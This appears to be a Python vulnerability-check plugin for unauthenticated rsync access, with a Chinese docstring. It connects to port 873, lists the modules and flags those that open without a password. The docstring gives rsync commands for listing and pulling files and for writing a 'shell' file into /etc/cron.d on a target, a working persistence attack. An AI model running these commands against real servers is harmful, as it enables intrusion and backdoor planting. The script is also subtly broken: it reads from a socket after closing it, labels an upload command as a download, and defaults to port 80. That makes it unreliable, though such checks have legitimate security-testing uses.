# -*- coding:utf-8 -*-
#python3
'''
name: Rsync 未授权访问漏洞
description: Rsync 未授权访问漏洞

列出这个模块下的文件：
rsync rsync://target_host:873/src/

下载任意文件：
rsync -av shell rsync://target_host:873/src/etc/cron.d/shell

写入任意文件：
rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell

'''

import re
import time
import socket

def sock_rsync_init(target_host,target_port):
    timeout = 3
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((target_host, target_port))
    sock.send(b'@RSYNCD: 31\n')
    res = sock.recv(1024)
    return sock

def get_all_pathname(sock):
    path_name_list = []
    sock.send(b'\n')
    time.sleep(0.5)
    result = sock.recv(1024).decode('utf-8')
    if result:
        for path_name in re.split('\n', result):
            if path_name and not path_name.startswith('@RSYNCD: '):
                path_name_list.append(path_name.split('\t')[0].strip())
    sock.close()
    return path_name_list

def is_path_not_auth(target_host,target_port,path_name):
    payload = path_name + '\n'
    sock = sock_rsync_init(target_host, target_port)
    sock.send(payload.encode('utf-8'))
    result = sock.recv(1024).decode('utf-8')
    sock.close()
    if result == '\n':
        result = sock.recv(1024)
    if result.startswith('@RSYNCD: OK'):
        return 1
    if result.startswith('@RSYNCD: AUTHREQD'):
        return 0
    if '@ERROR: chdir failed' in result:
        return -1
    else:
        return -1

def verify(protol, ip, port):
    ip = ip.strip()
    if port.strip():
        target_host = ip
        target_port = int(port)
    else:
        target_host = ip
        target_port = 80
    try:
        not_unauth_list = []
        flag = 0
        sock = sock_rsync_init(target_host, target_port)
        for path_name in get_all_pathname(sock):
            ret = is_path_not_auth(target_host,target_port,path_name)
            if ret == 1:
                flag = 1
                not_unauth_list.append(path_name)
            else:
                pass
        if flag == 1:
            msg = '[+] There is Seem Rsync Unauthorized Vuln! Dir: '+ str(not_unauth_list)
            return True,ip,msg
        else:
            msg = '[-] There is Not Seem Rsync Unauthorized Vuln!'
            return False,ip,msg
    except Exception as e:
        msg = '[-] There is Not Seem Rsync Unauthorized Vuln! Error：'+ str(e)
        return False,ip, msg

if __name__ == '__main__':
    ip =  "    192.168.43.90                   "
    print(verify("http",ip, "873 "))
